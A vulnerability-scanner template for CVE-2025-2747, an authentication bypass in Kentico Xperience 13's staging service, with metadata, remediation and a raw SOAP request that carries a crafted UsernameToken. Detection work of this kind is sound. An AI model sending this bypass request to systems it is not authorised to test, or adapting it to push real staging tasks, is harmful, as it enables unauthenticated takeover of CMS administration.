C/CVE-2025-2747.yaml

id: CVE-2025-2747
info:
  name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0006)
  author: DhiyaneshDK
  severity: critical
  description: |
    An authentication bypass vulnerability in Kentico Xperience allows authentication bypass via the Staging Sync Server component password handling for the server defined None type. Authentication bypass allows an attacker to control administrative objects.This issue affects Xperience through 13.0.178.
  impact: |
    Unauthenticated attackers can bypass authentication through the Staging Sync Server component by exploiting None-type password handling, gaining control of administrative objects and potentially compromising the entire Kentico CMS.
  remediation: |
    Upgrade to Kentico Xperience version 13.0.179 or later that properly handles Staging Sync Server authentication.
  reference:
    - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0006
    - https://devnet.kentico.com/download/hotfixes
    - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
    - https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-2747
    cwe-id: CWE-287
    epss-score: 0.90935
    epss-percentile: 0.99644
  metadata:
    fofa-query: app="Kentico-CMS"
    max-request: 1
    verified: true
  tags: auth-bypass,cve,cve2025,kentico,kev,stag,vkev,vuln,xperience13
variables:
  rand: '{{to_lower(rand_text_alpha(5))}}'
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - '{{rand}}'
          - <wsa:Action>
      - condition: or
        negative: true
        part: body
        type: word
        words:
          - Site not running
          - SyncServer.ErrorLicense
          - SyncServer.ErrorServiceNotEnabled
          - Staging service is not enabled on this server
          - Staging does not work with blank password
          - Missing X509 certificate token
          - The security token could not be authenticated or authorized
      - part: content_type
        type: word
        words:
          - text/xml
          # digest: 490a00463044022008bea81220754e913d3a3c1f237d4c04ec746ad5c5db7fa7700a2716d248d210022007b3abade99ef08c6d293934cf4b1f56c62cf4ed846f09127e16ac36bfe48396:922c64590222798bb761d5b6d8e72950
        # digest: 4a0a0047304502201bd2a8d2f92f29d11e8a643f566ad3bd8afc0033700794175f8d89ab26ffc3ba022100b2273a6ea513aad3659ea7cb313cbd25eb2429507c2a074a1da6854ec965e49c:922c64590222798bb761d5b6d8e72950
    matchers-condition: and
    raw:
      - |
        POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData"

        <?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Header>
                    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
                <wsse:UsernameToken>
                    <wsse:Username>y3t4kallxq</wsse:Username>
                    <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">6dfzCOJsdj5Aw+1rGzwoHadPFTQ=</wsse:Password>
                    <wsse:Nonce>4JX/SboVYnxbh8hm3ySQdIUJtFK9cqUh</wsse:Nonce>
                    <wsu:Created>2025-03-10T20:11:07Z</wsu:Created>
                        </wsse:UsernameToken>
                    </wsse:Security>
                </soap:Header>
                <soap:Body>
                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                        <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>
                    </ProcessSynchronizationTaskData>
                </soap:Body>
            </soap:Envelope>
